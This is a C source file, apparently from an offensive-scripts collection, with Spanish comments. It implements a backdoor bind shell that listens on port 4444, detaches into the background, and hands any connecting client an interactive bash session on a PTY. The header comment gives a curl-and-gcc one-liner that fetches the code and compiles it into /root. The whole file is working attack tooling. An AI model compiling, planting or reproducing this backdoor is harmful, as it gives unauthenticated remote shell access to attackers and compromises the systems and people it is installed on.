//
// curl -sL https://raw.githubusercontent.com/nipegun/dh-scripts/refs/heads/main/Ataques/BashReversoANetCat1.c > /tmp/BashReversoANetCat1.c; gcc /tmp/BashReversoANetCat1.c -o /root/BashReversoANetCat1
//
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <pty.h>
#include <utmp.h>
#include <string.h>

int main() {
    int sockfd, clientfd;
    struct sockaddr_in server_addr;
    int master_fd, slave_fd;
    pid_t pid;

    char *bash_shell[] = {"/bin/bash", "-i", NULL};
    char *env[] = {"TERM=xterm", NULL};  // Configurar TERM

    // Crear el socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) exit(1);

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(4444);

    // Enlazar el socket
    if (bind(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) exit(1);
    if (listen(sockfd, 1) < 0) exit(1);

    // Fork para ejecutar en segundo plano
    if (fork() != 0) {
        close(sockfd);
        exit(0);
    }

    while (1) {
        clientfd = accept(sockfd, NULL, NULL);
        if (clientfd < 0) continue;

        if (openpty(&master_fd, &slave_fd, NULL, NULL, NULL) < 0) exit(1);

        pid = fork();
        if (pid == 0) {  // Proceso hijo: ejecuta bash con un PTY real
            close(sockfd);
            close(master_fd);

            // Asociar el PTY a la sesión
            login_tty(slave_fd);

            // Ejecutar bash con el entorno TERM
            execve("/bin/bash", bash_shell, env);
            exit(0);
        }

        close(slave_fd);

        // Redirigir datos entre el atacante y la shell
        char buffer[1024];
        ssize_t n;
        fd_set fds;

        while (1) {
            FD_ZERO(&fds);
            FD_SET(clientfd, &fds);
            FD_SET(master_fd, &fds);

            int max_fd = (clientfd > master_fd ? clientfd : master_fd) + 1;
            select(max_fd, &fds, NULL, NULL, NULL);

            if (FD_ISSET(clientfd, &fds)) {
                n = read(clientfd, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(master_fd, buffer, n);
            }

            if (FD_ISSET(master_fd, &fds)) {
                n = read(master_fd, buffer, sizeof(buffer));
                if (n <= 0) break;
                write(clientfd, buffer, n);
            }
        }

        close(master_fd);
        close(clientfd);
    }

    close(sockfd);
    return 0;
}
